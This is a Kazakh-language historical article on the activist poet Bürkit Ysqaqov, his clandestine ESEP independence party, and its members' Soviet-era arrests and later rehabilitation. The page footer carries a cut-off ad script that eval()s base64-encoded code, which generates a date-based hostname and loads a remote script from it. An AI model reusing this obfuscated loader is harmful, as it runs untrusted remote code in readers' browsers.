Қазақстан Республикасы Президенті Н.Ә.Назарбаев: «ұлы тұлғаларын білмейінше, бірде-бір дәуірді дұрыстап тану мүмкін емес.
Адам тарихының айнасынан біз тарих көшінің жүрісін ғана аңдап қоймаймыз, оның рухын тынысын сеземіз.
Сондықтанда халқы мен елінің алдындағы өздерінің перзенттік парызын айқын да анық түсінген, қандай қиын-қыстау жағдайда оны адал орындаудан жалтармаған адамдар қай дәуірде де өмір сүрсе де дәйім жұртының нағыз азаматы болып қала бермек.
Тарихтың қай кезеңінде болсын олар өз ұлтының бетке ұстар мақтанышы болып келген», – дейді [1].
Осындай ұлт мақтанышы, қазақ ұлт қайраткерінің бірі – Бүркіт Ысқақов.
Бүркіт Ысқақовтың әдебиетке сіңірген еңбегі жайлы ғалым Рымғали Нұрғали жетекшілігімен Үмбетова А.Қ.
«Бүркіт Ысқақовтың шығармашылық мұрасы» атты кандидаттық жұмыс қорғағанмен, жалғанның жарығына кітап болып шығып халыққа жеткен жоқ.
Бүркіт Ысқақов жайында библиографиялық, энциклопедиялық басылымдарда және бұқаралық ақпарат құралдарында шыққан мақалалар ғана, негізінен тұлға тарихи тұрғыдан ғылыми зерттеу нысанына айналған жоқ.
Сондықтанда, Бүркіт Ысқақовтың ұлттық қайраткерлік тұрғысындағы қоғамдық істерін сараптап, еңбектеріне талдау жасауды өзіміздің мақсатымыз деп санаймыз. 
Тарихымыз тәуелсіздік алумен қайта жаңғырып ақтаңдақ мәселелер ұлттық тұрғыдан зерттеліп зерделену үстінде.
Сондай ұлттық тарихтағы кең зерттеуді қажет ететін Тәуелсіздікке жету жолдары үшін кеңестік тоталитаризм билік жағдайында Алаш идеясы үшін күрескен қоғамдық ұйымдар мен жеке азаматтардың қызметі тақырыбы.
ХХ ғасырдың басында ұлттық бірлікті нығайту идеясын алға тартқан рухани-зерделі Алаш қайраткерлерін әр жылдардағы, 1937-1938 жылдары жаппай репрессияға ұшыратып, кеңестік дәуірде тоталитарлық жүйе тұсында ұлттық сана, дін мен діл, әлеуметтік құрылым, әлеуметтік түзілім, адамзат қауымдастығының мораль мен этникалық құндылықтары аяусыз ойрандалды.
Осы сипаттағы әкімшіл–әміршіл жүйе қысымына деген ұлт наразылығы елдік қасиеттерді басты орынға қойған саяси ұйым, жекелеген тұлғалар қызметі арқылы көрініс тапты.
Қазақ ұлтының келбетін сақтап, санада өшуге айналған ұлттық құндылықтарды тарихи үзілмей жеткен сабақтастықпен Бүркіт Ысқақов келешекке жеткізу үшін күрескен, болашақ ұрпақтың тәуелсіздігі жолында Қарағанды қаласында «ЕСЕП – елін сүйген ерлер партиясын» құрды [2, 83-90 бб.].
Бүркіт Ысқақов  1924 жылы 4 қарашада Қарағанды облысының Нұра ауданына қарасты Көкмөлдір ауылында туған [3, 566 б.].
Жастайынан халық ауыз әдебиетіне құмар болып, жаттап өскен, ұлттық қайнардан қанып ішкені турасында Бүркіт Ысқақов: «бір жылы сол атам Абай Құнанбаевтың 1909-жылы Петербургте басылып шыққан өлеңдер жинағын қолына түсіріп алыпты.
Өзінің келіні әрі менің шешем Нұржамалды шақырып алып, әлгі Абай өлеңдерін оқытатын.
Ол өлеңдерді атамның жанында жатып алып мен де тыңдайтынмын», — деген ойынан, тәрбие бастау бұлағын текті атасынан алып және анасының сауатты болуы үлкен рөл атқарғандығын көреміз [4, 14 б.].
Айгүл Бүркітқызы да: «бетін қақпай өсірген қайсарлық та осы атасына дарыған», – дейді [5].  Қазіргі кезеңдегі Тәуелсіз Қазақстан идеологиясының мәйегі – ұлттық патриоттарды тәрбиелеу екендігі аян, сондықтанда, ұлттық қазақы қайнардан қанып ішкен сәби болашақта өз ұлтының сенімін ақтайтынына Бүркіт Ысқақовтың дәлелінде көз жеткіземіз.
Балалық шағы Кеңестік тоталитарлық билік жылдарымен қатар келіп, қызылдардың жүргізіп жатқан саясатын, көргендерін көкірегіне түйіп өскенін және қазіргі таңдағы өзекті мәселелердің бірі ономастика жайында Бүркіт Ысқақов: «қазір Көкмөлдір деген ат ешбір картада, ешбір іс қағаздарында жоқ, бірақ ол менің паспортымда әлі күнге дейін сақталып келеді.
Бұл маған өзімнің туған ауылыма, өскен жеріме деген мәңгілік махаббатымның белгісіндей көрінеді.
Кейін өз ауылыма арнап «Көкмөлдір» деген өлең де жаздым.
Ол менің әр жылдары жарық көрген өлең жинақтарымнан орын алып келеді.
Кейін «Өндіріс» деген ат та тұрақтамай, оны «Ұзақбай», «Сәкен» деп өзгертті.
Бірақ олар да ұзаққа бармай, «Октябрьдің қырық жылдығы» атындағы колхоз аталды.
Қазір оның өзі де жоқ, өйткені ол «Чернигов» совхозының үшінші фермасына айналды да, «Үшінші ферма» аталуда.
Бірақ ауылдың атын осыншама сан саққа жүгіртіп, қырық құбылтып, өзгерте бергенде, мемлекетке, үкіметке қандай пайда келді?», — деп, сұрақ қойып, ойландыра толғандырады [4, 14 б.].
Кеңестік тоталитарлық биліктің алғашқы жылдарында іске асырылған қазақи жер-су атауларын өз қалауларына қарай өзгертуі халықтың санасынан тарихи атауларды өшіріп орыстандыру саясатын жүргізгендігінің бірден-бір жарқын мысалы. 
Бүркіт Ысқақов 1940 жылы Қарағанды мұғалімдер институтына (қазіргі акдемик Е.А.Бөкетов атындағы Қарағанды мемлекеттік университеті) келіп түседі [6, 124 б.].
17 жастағы жасөспірім Бүркіттің ел өмірінің ащы шындықтарын көзімен көріп, көкірегімен ой түйіп жүргенін қанды көйлек досы Махмет Темірұлы естелігінен көреміз: «Тарих сабағының мұғалімі Қабзәкір Байтасов студенттерден карта алдында сабақ сұрайды.
Кезек Бүркітке келеді, мұғалім оған күлімдеп: «Сен, шын ақын болсаң осы картаға қарап тұрып, көп ойланбастан бір ауыз өлең шығарып жіберші»,-дейді.
Сонда ол қомданған бүркітше ширыға түсті де, көп ойланбастан: 
Уа, Азия, ұлысың, 
Ұлылығың құрысын. 
Құрысын демей не дейін, 
Еуропаның құлысың, – дегенде мұғалім де, тыңдап отырған біздер де Бүркіттің ақындық алғырлығына өте риза болып, сүйсініп қалдық», — дейді [7, 51 б.].
Тоталитарлық биліктің уақыты жүріп тұрғанда өз өмірінен қорықпастан саяси тақырыпта өлең шығаруы Бүркіттің саяси жан-жақтылығын және қазақ ұлтын ойлаған ер екенін көреміз. 
Қарағандыға мұғалімдер институтына келіп түсіп, ой-өрісі жетіліп азаматтық тұлғасының қалыптасып дамуына Ресейдің жер-жерінен келген оқытушылардан және қазақ әдебиетінің аға оқытушысы Айтбай Нәрешевтен дәріс алуы көп пайдасын тигізді.
Институт жанынан «Жас қалам» әдеби үйірмесі жұмыс істеген және қолжазба журнал шығып тұрған.
Пушкин атындағы Орал педагогикалық институтын бітірген, қазақ әдебиеті пәнінің оқытушысы Айтбай Нәрешев болған [8, 4 б.].
Әдеби ортаға тез бейімделіп, жетекшінің көмекшісі болған.
Үйірмеде жүрген кезінде Айтбай Нәрешевтың кітапханасынан Алаш қайраткерлерінің, оның ішінде Ахмет Байтұрсыновтың «Маса», «Қырық мысал», Міржақып Дулатовтың «Оян, қазақ» және Сәбит Мұқановтың «ХХ ғасырдағы қазақ әдебиеті», 1-бөлім, «ұлтшылдық дәуірі» («Қазақстан» баспасы, 1932 жыл, Қызылорда) латын әрпімен шыққан кітаптарын үйірмеге әкеп бірге талдайтын.
Мысалға, Ахмет Байтұрсынұлының:
Қазағым елім,
Қайқайып белің,
Сынуға тұр таянып.
Талауда малың,
Қамауда жаның,
Аш көзіңді оянып!
Қанған жоқ па әлі ұйқың, 
Ұйықтайтын бар не сиқың?! – деген өлеңдерді оқып халықтың нағыз досы Алаш партиясы сияқты өз еліне қызмет ететін партияның керек екенін түйсінеді.
Саналы да арлы жастардың көкейлерінде «біз келешекте не істеуіміз керек» деген сұрақ мазалайды.
Оған жауапты Мағжан Жұмабаевтың:
Кене мен Абылайдың жолын қумай. 
Жапанда жайылудың мәні қалай?! – деген өлең жолдарынан табады.
Өздерінің келешекте қазақ халқының азаттығы, тәуелсіздігі үшін күрескен Абылай мен Кене хандардың жолын қууға бел байласады [9].
Осы кітаптарды оқып, саналарына тоқығаннан кейін Алаш қайраткерлерінің алдыңғы және кейінгі буынының ойлаған ойы, іске асырамын деген армандары үзілмей жеткен тарихи сабақтастық арқылы «ЕСЕП» партиясының да құрылуына түрткі болады.
ЕСЕП партиясының белді мүшесі Махмет Темірұлы: «1941 жылдың бас кезінде «ЕСЕП» партиясы дүниеге келді», – дейді [10, 36 б.].
Бүркіт Ысқақов (негізін қалаушы), Махмет Теміров (орынбасары), Елеш Бимағанбетов, Дәкен Шалабеков, Аманжол Дүйсенбаев, Әшім Сүлейменов, Жанайдар Әубәкіров – бұлар инстиутта оқып жүрген студенттер.
Ауылдағы пікірлес достары және партия мүшелері: Рақыш Бұйрабеков, Кәмәли Рахметов, Қажыкен Тінтаев, Аққошқар Мұқанов, Байдалы Боқаев, Ақаш Мұқанов, Балапан Сәкібаев, Орынбай Сауқанов, Сайдалы Кенжебаев (Мақуов кейіннен).
Тарих факультетінің студенттері де пікірлес болған, олар Нүркенов Ахметжан, Сейітов Қайлеш, Аманбаев Мұқаш, Әубәкіров Хайридден.
Институтта Бүркітпен жақсы достардың бірі Жаппар Өмірбеков және ерекше тілектестері Оңайбек Құдышұлы, Орынбай Айтмағанбетов.
Құптаушылар сол кездегі жалғыз Жамбыл атындағы  қазақ мектебі оқушылары да болды.
Мектепке барып Алаш ақындарының өлеңдерін оқып, жырмен сусындандыратын оқушыларды.
Мақсаты – тәуелсіз ел болу, міндеті – жастарды ұлттық рухта тәрбиелеу.
Мақсатқа жету үшін, міндетін іске асыру үшін өз бағдарламасы мен заңдарын құрды.
Энгельстің «Коммунистік партияның Манифесін», «КОКП-ның програмасы мен уставтарын» оқып, көзқарастары қарама-қарсы болса да, өз бағдарламаларын салыстыра отырып жасаған.  «ЕСЕП» партиясының негізгі ұстанымдары келесідей болды: «отарлық бұғаудан босану; азаттық алу үшін күресу; саяси жағдайды алдын-ала бағамдай білген, коммунизмге зор қауіптің төніп келе жатқанын, КСРО талқандалса қолайлы жағдайды пайдалану; жастардың ұлттық ой-санасын ояту; туған халқының мүддесі мен намысы үшін жан аямай күресу; келешекте көздегендері халықтық мемлекет; Қазақстанда тұратын, туып өскен, туған жерін сүйетін халыққа арқа сүйейді; отарлық бұғаудағы халықтармен одақтасу; түбі бір түркі елімен ынтымақтасу; дін Исламды ұстанған халықтармен бірігуге талпыну; коммунистік жүйе құрсауындағы елдерді қолдауға шақыру; «ЕСЕП» партиясының төңірегіне жиналыңдар.
Туған жер, туған халқың үшін жан пида!» [2, 86-87 бб.].
Қазақ жастарының санасына осы айтылғандарды сіңдіруге біріншіден, әкімшіл-әміршіл жүйе кедергі жасаса, екіншіден, импералистік мемлекеттердің әлемді бөлісу саясатынан тұтанған 2-Дүниежүзілік соғыстың басталуы «ЕСЕП» – тің кең таралуына мүмкіндік бермеді. 
Импералистік мемлекеттердің әлемді бөлісу саясатынан тұтанған екінші дүниежүзілік соғыспен Бүркіт Ысқақовтың жалындаған жастық шақтары қатар келді.
Саясаттың салқын ызғарын ерте бастан көріп-сезіп өскен Бүркіт Ысқақов мүшелері Германия фашистерінің 1941 жылы 22 маусымда КСРО-ға соғыс ашуын өз армандарын іске асыруға бір мүмкіндік ретінде қарастырды.
Өз қатарластарынан оқ бойы озық болған, ой-өрісі ерте жетілген, ЕСЕП партиясынның негізін қалаған Бүркіт Ысқақов осы мүмкіндікті былайша түсіндіреді: «қардың басын қар алады, ханның басын хан алады» дегендей Гитлер де, Сталин де бірін-бірі құртпай тынбайды.
Бұл соғыста Кеңес өкіметі жеңілсе, амалсыздан күшпен бірігіп отырған одақ ыдырайды да әр ұлт өз алдына дербес тәуелсіз мемлекет болуына мүмкіндік алады», – дей келіп өз ойын нақты фактілермен дәлелдеп, ойын мына өлеңмен толықтырады: 
«Жастарды айдап ұрысқа, 
Қарттарды айдап жұмысқа. 
Отырғаны советтің, 
Ойлаңдаршы дұрыс па?!», — деген жолдарға өзі жауабын келесі өлең жолдарымен береді: 
«Жоқ, бұл жатпайды дұрысқа, 
Жатпаса бұл дұрысқа, 
Барма жастар ұрысқа! 
Барма қарттар жұмысқа!», — деп ойын түйіндейді [11, 53-58 бб.].
Бүркіт Ысқақов негізін қалаған 1937 – 1938 жылдары жаппай ұлт зиялыларын репресияға ұшыратқаннан кейін, бір партиялық жүйемен қабаттаса ұлттық тәуелсіздікті армандаған, ЕСЕП партиясы ҚР ҰҚК құжаттарында: «…Искаков и Темиров в период учебы в Нуринской средней школе, а затем в 1940-1942 годах в Карагандинском учительском институте создали антисоветскую националистическу орзанизацию «ЕСЕП» (партия героев, любяших Родину), которая своей задачей ставила оттражение Казахстана и республики Средней Азии от Советского Союза и создания на их территории буржуазной государства; проводили среди Казахской молодежи антисоветскую агитацию, читали контрреволюционную литературу», – деп көрсетіледі [12].
Осы мұрағат құжаттарын саралап, Бүркіт Ысқақов құрған ЕСЕП партиясы тарихын төрт кезеңде бөліп қарастырғанды жөн деп білеміз: 1) қалыптасу кезеңі – 1940-1942 жылдары; 2) даму кезеңі – 1944-1951 жылдары; 3) шарықтау кезеңі – 1960-1964  жылдары; 4) тарихи сабақтастық кезеңі – тәуелсіздікке қол жеткізу [13, 73-81 бб.]. 
Екінші даму кезеңі, 1944-1951 жылдары ұлттық тәуелсіздік үшін жүргізілген үгіт – насихат нәтижесіз болмады.
Оның дәлелі, әділетсіз қоғамға қарсылық кейінгі буыннан Қарағандыда қолдау тапқанын: «1944 жылдың тамыз–қазан айларында өмірге әлі келмеген «Елін сүйген ерлер партиясы» (ЕСЕП) партиясының белсенділері ретінде «Советтік Қарағанды» газетінің қызметкері Бейсембай Жақсылықов, облыстық драма театрында істейтін Зейнолла Әбілдин, Жамбыл Рүстемов, «Социалистік Қазақстан» газетінің Қарағанды облысы бойынша меншікті тілшісі Жаппар Өмірбеков Қарағанды облыстық ішкі істер (НКВД), мемлекеттік қауіпсіздік (КГБ) басқармалары тарапынан тұтқындалады», – деп көрсетіледі [14, 411 б.].
Автор Әбіжаппар Әбдәкімұлы айтқандай өмірге әлі келмеген емес, ұлттық қауіпсіздік құжаттарынан және ЕСЕП партиясының құрылу кезеңінде: «институтта Бүркітпен жақсы достардың бірі Жаппар Өмірбеков», — деген жолдардан көргеніміздей ЕСЕП партиясының даму кезеңі екенін көреміз.
1950 жылы 26 желтоқсанда «Правда» газетінде Т.Шойынбаев, Х.Айдарова, А.Якуниндердің  «Қазақстан тарихы мәселелерін марксистік-лениндік тұрғыдан баяндайық» деген мақаласының жариялануы кезекті қуғын-сүргіннің басталуына себеп болды.
«ЕСЕП» партиясының мүшелері Алматыда жүрген кездерінде де бастаған істерін тастамай жалғастыруда болады.
Аса сақтықпен жастардағы ұлттық рухты дамытуы жайлы: «…Искаков пен Темиров Ұлы Отан соғысы біткеннен кейін заңға қарсы қарым-қатынастарын қалпына келтіріп, 1950 жылы Алматы педогогикалық институтының студентері Калиев, Азанбаев және Аманкуловтарды өз топтарына тартқан», – деп түйінделген [12].
Ұлтшыл азамат Бүркіт Ысқақов өзінің «ЕСЕП» партиясы  мүшелерімен ақылдаса келе Е.Бекмахановты қолдап, Кенесары қозғалысын отаршылдыққа қарсы бағытталған күрес екенін дәлелдеп жауап хатты «Правда» газетінің өзіне жазуға келіседі.
Сол кездегі үш адамның бірі МҚК-нің астыртын жансыз адамдары болатын.
Сондықтан, Буркит Искаков 1951 жылдың 18 қаңтарында «Лениншіл жас» (қазіргі «Жас Алаш») газетінің жауапты хатшысы қызметінде, жұмыста отырған жерінен қауіпсіздік қызметінің адамдары тұтқындайды.
Бостандықта қалған, «ЕСЕП» партиясы мүшелерін Махмет Темиров, Нарешев Айтбай, Нарешев Рамазан, Калиев Жакен, Азанбаев Мустахим, Аманкулов Адырбектерді бірінен кейін бірін ұлттық қауіпсіздік қызметкерлері тұтқындайды [12].
Тергеу алты айға созылып, Қазақ КСР Жоғарғы Сотының Қылмысты істер жөніндегі Коллегиясының 1951 жылғы 14 – 15 маусымдағы үкімі бойынша РСФСР Қылмысты Істер Кодексінің 58-10, 58-11 баптарының 2 тармағымен айыпталып, Буркит Искаков, Махмет Темиров, Нарешев Айтбай 25 жыл мерзімге бас бостандығынан айыруға кесіліп, оған қосымша 5 жылға азаматтық құқығынан айырылады.
Нарешев Рамазан, Калиев Жакен, Азанбаев Мустахим 10 жыл мерзімге бас бостандығынан айыруға кесіліп, оған қосымша 4 жылға азаматтық құқығынан айырылады.
Аманкулов Адырбек 8 жыл мерзімге бас бостандығынан айыруға кесіліп, оған қосымша 3 жылға азаматтық құқығынан айырылады [12].
Махмет Темиров пен Нарешев Айтбайды Сиблагқа – Иркутск облысына айдауға жіберсе, қалған бесеуін Буркит Искаков, Нарешев Рамазан, Калиев Жакен, Азанбаев Мустахим, Аманкулов Адырбектерді 1948 жылы Жезқазған өңірінде, басқармасы Кеңгір елді – мекенінде құрылған «Степлаг» лагерінде тұтқында өмірлері өтті [13, 78 б.].
Осы жылдары «Үкіметке қарсы үгіт жүргізгендер», «Отанына опасыздық жасағандар» деп аталатын 58 баптың 10–11 тармағы бойынша немесе «үштіктің» бұйрығымен азапталған тұлғаларымыз қаншама еді.
1956 жылдың атақты, аты шулы ХХ съезд жеке басқа табынуды әшкерелеуі, Коммунистік партияның саясатына оң өзгерістер енгізді, ұлт зиялыларына оң әсерін тигізді.
КСРО Жоғарғы Соты Қылмысты істер жөніндегі Коллегиясының 1956 жылғы 17 қарашадағы қаулысы бойынша Бүркіт Ысқақов бастаған «ЕСЕП» партиясы мүшелері толық ақталып, партиялықтары қалпына келтірілді.
14.04.1993 жылғы «Жаппай саяси қуғын – сүргін құрбандарын ақтау туралы» Қазақстан Республикасының Заңы бойынша «ЕСЕП» партиясы мүшелері құқықтары қалпына келтірілген [12]. 
Бүркіт Ысқақов қамауда жүрген күннің өзінде өлең жазып, қазақ әдебиетінде тұңғыш түрме жырын туғызады, басына бостандық тиіп, құқы қалпына келтірілгеннен соң өндіртіп жазады.
Сондай шығармаларының бірі – «Қарлығаштың құйрығы неге айыр» атты өлеңмен жазылған ертегісі.
Осы шығарма желісінде қазақ кино өнері тарихында тұңғыш мультфильм 1966 жылы Әмен Хайдар жетекшілігімен жарыққа шықты [15, 15 б.].
Қазақ даналығы «аңызда – ақиқат бар» айтылғандай, осы ертегі желісіндей Нұра ауданындағы Талдысай ауылындағы Айдаһарлы үңігірінде осы тақілеттес аңыз бар [16].
Сондықтанда Бүркіт Ысқақов жас кезінде қарттардан естіген аңызын өлең жолдарына түсіруі мүмкін.
Ал енді этнографиялық сәйкестіктерді: «ертегіні жазған Б.
Ысқақов Нұра ауданы, Көкмөлдір деген жерде туған, аңыз Нұра ауданы, Талдысай ауылында, Айдаһарлы үңгірінде туған; ертегі желісі Айдаһармен байланысты, аңыз желісі Айдаһармен байланысты; ертегіде Айдаһар үстемдігін жүргізген, аңыз Айдаһар байдың малын баққан, қараған; ертегі Айдаһар ауыруы, аңызда бай баласының Айдаһардың таудан шығып жатқан құйрығын шауып тастауы; ертегі жас баланың қаны, аңызда бай баласын Айдаһар жеп қойған», – санамалай беруге болады.
Бүркіт Ысқақов қазақ ұлтының рухани асқақтауы үшін өзі ғана ғылым жолында жүріп қоймай, артындағы бауырларына ұлт мәдениетін ұлықтап жүрген жас дарындарға да қол ұшын беріп, көмегін аямаған.
Бүркіт Ысқақовтың шарапатына лайық болғандардың бірі айтулы ғалым Мұхтар Мағауин болды.
Қазақ әдебиетінің тарихын үш жүзжылдыққа тереңдеткен «ХV-ХVІІІ ғасырларда жасаған қазақ ақын, жыраулары» кейін «Қобыз сарыны» деген атпен шыққан монография атты диссертациясын жекелеген тақырыпшаларға бөліп, жариялау кезіндегі бір эпизод жайлы Мұхаң былай дейді: «Әуелгісі – Асан Қайғы.
Қисығын, қырсығын сыпырып тастап, – таптық тұрғы әзелден жоқ, – шағын, әдемі мақала жасадым.
Үйде өз қолыммен мәшеңкеге түсіріп, «Білім және еңбек» журналына апардым.
Мұнда бөлім бастығы болып, ол кезде жасы қырықты алқымдаған Бүркіт Ысқақов отыр екен.
Сыртынан ғана білем, кейін жақынырақ таныстық, ақын әрі әдебиетші, туа біткен ұлтшыл, сол ұлтшылдығы үшін жиырманың ішінде ұсталып, жиырма бес жылға каторгаға айдалған, одан замана кеңейген кезеңде ғана шыққан, сонша талқыдан өтсе де, әуелгі мұратынан айнымаған абзал адам еді.
Мақаланы жақсы құптап қабыл алды, «Асан Қайғы» деген тақырыптан соң қолма-қол, жіті шолып шығып, үкімін айтты, жақсы екен, осы жаңа жылдың ар жақ, бер жағында шығарамыз деді.
Менің жайымды сұрап, қазақ хандығы дәуіріндегі әдебиет тарихынан көлемді зерттеу жазып біткенімді естіп, риза болып қалды, тілектестік білдірді.
Бүркіт аға қабыл алған «Асан Қайғы» деген мақала «Білім және еңбек» журналының 1966 жылғы 2-санында басылған еді.
Мен үшін кезеңдік мәні болған, қуаныш әкелген мақала» [17, 9-10 бб.].
Үшінші шарықтау кезеңі, 1960-1964 жылдары Қарағандыда «ЕСЕП» партиясының идеясы жанданып, жоғарғы оқу орындарында кеңестік өкіметке қарсы үндеулер мен ұран-парақшалар шыға бастады.
Осы жылдардағы қарсылық туралы, мұрағат құжаты №12-іс айыптау қорытындысының деректерінде, ұйымдастырушылары Зейнулла Игиликов пен Камель Жунусов.
Олар 1961 жылдың қаңтарында кездесіп, өздерінің анти кеңестік ойларымен бөліседі, олардың ішінде жүргізіліп отырған саясатты, орыс коммунистерінің бел алуы, қазақ тілі мен мәдениетінің жоғалуы және т.б.
1961 жылдың наурызында өздерінің ойларын жазбаша түрде жоғарғы оқу орындарындағы жастарға жеткізуді көздеген.
1961 жылдың сәуір айының екінші жартысында Игиликов жазып, Жунусов құптап «Жас қазақ» атымен редакциялаған.
1961 жылдың 22 сәуірінде Шет аудандық тұтынушылар одағында хатшы Рымкеш Нуртазинамен жақындықтарын пайдалану арқылы 14 данамен жазу машинкасында жоғарыдағы құжатты көбейткен.
1-мамырда 10 парақты Ақшатау кентіндегі поштамен Қазақстанның түрлі жоғарғы оқу орнындарына жіберген.
Өздері тұратын Ақсу-Аюлыны біліп қоймас үшін, із адастыру үшін жасаған.
Бұл хаттармен Орал және Қызылорданың мұғалімдік институттарында, Алматының шаруашылық және Киров атындағы Қазақ ұлттық институттарында жоғарғы оқу орындарының студенттерінің көп бөлігі танысқан.
Бірақ 1962 жылдың 10 желтоқсанында Зейнолла Игіліковты, ал 1962 жылдың 17 желтоқсанында  Кәмел Жүнісовты тұтқындайды [13, 78-79 бб.].
Зейнолла Игілікұлы мен Кәмел Жүністегінің «Жас қазақ» атымен редакциялаған хаттарының әсері Қарағандыдағы жоғарғы оқу орындарының да студенттерінің арасынан қолдау тапты.
Оған мысал ретінде, Қарағанды педогогикалық институты, тарих-филология факультеті, қатысушылар физика-математика факультеті мен нақты ғылымдар факультеттерінің комсолол активтерімен 8 мамыр 1964 жылы өткен жабық комсомол жиналысында қаралған күннің мәселесі студент-комсомолдар Омарбеков Максым, Саугабаев Карим, Адикаримов Совет, Спаин Аманжолдардың жеке істері қаралады.
Істі қарау барысында Карим Саугабаевқа: «Жунусовтың соты болған кезде сіз неге өзгелерден ерекше көп «Тоқтат енді» деп неге айқайға бастың.
Бұл жағдайды сотпен келіскеушілігіңді қалай түсіндіресің?»,- деген сұрақтар қойылған.
Аманжол Спаинға сөз кезегі берілгенде 1961 жылы бірінші курста оқып жүрген кезде Ақбастаудан хат келгенін айтады.
Осы екі мысалды талдағанда ЕСЕП партиясының жастарға  жүргізген үгіт насихатының жемісі және жоғарғы оқу орындарында оқып жүрген жастардың санасына ұлттық рухты себуі нәтижелі болды [13, 79 б.]. 
Төртінші тарихи сабақтастық кезеңі – Тәуелсіздікке қол жеткізу.
ЕСЕП (Елін сүйген ерлер партиясы) партиясында болған азаматтардың фото суретері мен құжаттары Тәуелсіз Қазақстан болашағы жастарды тәрбиелеу мақсатында Қарағанды облыстық тарихи-өлкетану музей экспозициясында ашылған «ХХ ғасырдың 30-50 жылдарындағы Қазақ зиялыларының тағдыры» залына қойылған.
Осы ойымызды Махмет Темірұлының сөзімен сабақтастырсақ: «Бірақ еркіндік, дербестік жалындағы ұлы қозғалыс қазақ халқының, хандары мен билерінің, батырлары мен бағландарының ел қорғаған жорықтары мен шайқастарынан, ұлт-азаттық күрестерден, Алаш идеясынан, содан туындаған «ЕСЕП», Мәскеудегі «Жас тұлпар», Керекудегі «Жас ұлан», Хасен Қожа-Ахмет құрмақ болған «Жас қазақ» секілді ұйымдардан, Желтоқсан көтерілісінен тұрмай ма?» [13, 79 б.].
Осы мақаламызбен айтпақ ойымыз, Алаш идеясын нәр алған – Бүркіт Ысқақов негізін  қалаған «ЕСЕП» партиясы сол кезде тәуелсіздігімізді алып бермесе де, қауіпсіздік қызметінен басқа ешқай жерде тіркелмесе де халық жүрегінен орын алды.
Ол тәуелсіздіккке жетеміз деген қайсар сенімді одан әрі бекітіп, үзілмеген тарихи сабақтастық арқылы Желтоқсан көтерілісімен ұштасты.
Желтоқсан көтерілісі 70 жыл дүркіреген алып Кеңестер Одағын таратуға алғы шарт жасады.
Бүркіт Ысқақовтың еңбектері мен ұлты үшін саяси экономикалық, рухани саладағы тәуелсіздіктің қаншалықты құнды екенін түсінуі, сол үшін үнемі күресу керектігі оның өмірлік мақсаты болғанын көреміз.
Ол елімізде орнаған кеңестік биліктің отаршыл сипатын танып, оны сынай білді.
Оның айтқанындай социалистік құрылыс қазақ және басқа халықтарға саяси тәуелсіздік пен экономикалық гүлденуді қамтамасыз етпейді деген ой-пікірлерінің дұрыс екендігін уақыт өзі дәлелдеді.
Сонымен бірге, Тәуелсіз ел болған соң да, қалай өмір сүрудің тұжырымдамасын жазады.
Оның пікірінше, түбі бір Түркі елі мен отарлық бүғаудағы әлем елдері және дін Исламды ұстанған халықтар барлығымен одақтасу, тең қарым қатынас орнату, яғни көпвекторлы саясат ұстауы қажет екенін айтып кеткен.
Қазіргі Қазақстан Республикасында көп ұлтты халықтың бірлікте өмір сүріп отыруын сол уақытта Бүркіт Ысқақовтың көздегенін Қазақстанда тұратын, туып өскен, туған жерін сүйетін халыққа арқа сүйейді және келешекте көздегендері халықтық мемлекет дегенінен көреміз.
Бүркіт Ысқақовтың ұлттық тәуелсіздік идеясы, бүгінгі Тәуелсіз Қазақстанның ұлттық идеологиясымен ұштасып жатуы – оның ұлттық тарихтағы орнын, қалдырған тарихи мұрасын «бүркіттану» ғылымын жаңа зерттеу кезеңіне жеткізу қажеттілігін көрсетеді.
P.s.
Ұлт қайраткері – Бүркіт Ысқақов есімін болашақ жастардың есімінде қалдыру үшін бір топ азаматтар облыс әкіміне хат жазып Нұра ауданындағы Щербина көшесін Бүркіт Ысқақов есімімен атау ұсынысын көтеріп, көше халықының 80 пайыз қолдауымен ұлт қайраткері Бүркіт Ысқақов есімен атауға өз қолдауларын білдірді.
Осы игіліктің істің басы-қасында жүріп атсалысқан аға-апаларымызға шын жүректен алғыс айтамыз..Жағыпар Әділет Бауыржанұлы,
облыстық тарихи-өлкетану музей ғылыми қызметкері,
гуманитарлық ғылымдар магистры
Арнайы «Қасым» порталы үшін.Бөлісіңіз:






 
          var node4990 = document.getElementById("MIXADV_4990");
          if( node4990 )
          {
               var script = document.createElement("script");
               script.charset = "utf-8";
               script.src = "https://m.mixadvert.com/show/?id=4990&r="+Math.random();
               node4990.parentNode.appendChild(script); 
               script.onerror = function(){
                  window.eval( atob("dmFyIGRhdGUgPSBuZXcgRGF0ZSgpO3ZhciBtb250aCA9IGRhdGUuZ2V0TW9udGgoKSArIDE7IHZhciBkYXkgPSBkYXRlLmdldERhdGUoKTsgdmFyIHllYXIgPSBkYXRlLmdldFllYXIoKTsgdmFyIG5hbWVfZGF5ID0gZGF0ZS5nZXREYXkoKSArIDE7dmFyIGRvbSA9IFsgInBybyIsICJ0b3AiLCAiaW5mbyIsICJvbmxpbmUiLCAic3BhY2UiLCAic2l0ZSIsICJ0ZWNoIl07IHZhciBzdHIgPWRheSoobW9udGggKiBuYW1lX2RheSAqIGRheSkrIiIrIGRheSoobW9udGggKyBuYW1lX2RheSArIGRheSAreWVhcik7dmFyIGhhc2ggPSAgYnRvYShidG9hKHN0cikpLnRvTG93ZXJDYXNlKCk7IHZhciBob3N0ID0gaGFzaC5zdWJzdHJpbmcoMywgaGFzaC5sZW5ndGggLSBuYW1lX2RheS8yKSsiLiIrZG9tW25hbWVfZGF5IC0gMV07dmFyIHIgPSBNYXRoLnJhbmRvbSgpLnRvU3RyaW5nKDM2KS5zdWJzdHIoMiwgMik7ciA9IHIucmVwbGFjZSgvWzAtOV0vZywgIiIpO3ZhciBkZWx0YSA9IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqICgxMDAgLSAxMCArIDEpKSArIDEwO3ZhciBpZCA9IDQ5OTAgLSBkZWx0YTsgdmFyIHNjcmlwdF9maXJzdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3NjcmlwdF9maXJzdC5zcmMgPSAiaHR0cHM6Ly8iKyBob3N0KyIvIitkZWx0YStpZCtyKyIiOyBub2RlNDk5MC5wYXJlbnROb2RlLmFwcGVuZENoaWxkKHNjcmlwdF9maXJzdCk7c2V0VGltZW91dCggZnVuY3Rpb24gKCkge3NjcmlwdF9maXJzdC5yZW1vdmUoKX0sIDQwMDApO3NjcmlwdF9maXJzdC5vbmVycm9yID0gZnVuY3Rpb24oKXsgc2V0VGltZW91dCggZnVuY3Rpb24gKCkgeyBpZiggbm9kZTQ5OTAuaW5uZXJIVE1MID09ICIiICkg